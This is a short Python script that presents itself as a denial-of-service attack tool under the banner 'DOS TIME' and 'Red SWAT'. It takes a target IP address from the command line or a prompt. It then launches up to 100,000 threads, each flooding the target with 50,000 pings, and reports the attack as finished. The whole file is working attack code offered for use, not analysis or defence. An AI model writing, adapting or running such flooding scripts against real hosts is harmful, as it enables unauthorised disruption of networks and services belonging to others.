import sys
import threading
import subprocess
from termcolor import colored

def show_banner():
    banner = """
                    ☢️ D  O  S --- T  I  M  E ☢️
    💻: Hey!<═══>🖥️: What?<═══>💻: Are you alive?<═══>🖥️: Yes!
    💻: Hey!<═══>🖥️: What?<═══>💻: Are you alive?<═══>🖥️: Yes
    💻: Hey!<═══>🖥️: What?!<═══>💻: Are you alive?<═══>🖥️: Y3s@&!!!!
    💻: Hey!<═══>🖥️: wh@T!&<═══>💻: Are you alive?<═══>🖥️: 💀
    -----------------------------------------------------------------
    """
    print(colored("    [☢️] Script mode: ", "light_yellow") + colored("🔴 Red SWAT", "red"))
    print(colored("    [☢️] Function: ", "light_yellow") + colored("Launch DoS attack\n", "red"))

def launch_DoS_attack(targetIP, counts=100000):
    def send_ping():
        subprocess.run(["ping", "-n", "50000", targetIP], capture_output=True, text=True)

    threads = []
    print(colored(f"[*] Pinging {targetIP}"))
    for i in range(counts):
        thread = threading.Thread(target=send_ping, name=f"DoS ping {i}")
        thread.start()
        threads.append(thread)

    for thr in threads:
        thr.join()

show_banner()
if len(sys.argv) > 1:
    target = sys.argv[1]
else:
    target = input(colored("[*] Enter the target IP: ", "yellow"))
print(colored("[*] Launching DoS attack...", "light_red"))
launch_DoS_attack(target)
print(colored("[+] DoS attack finished successfully!", "green"))
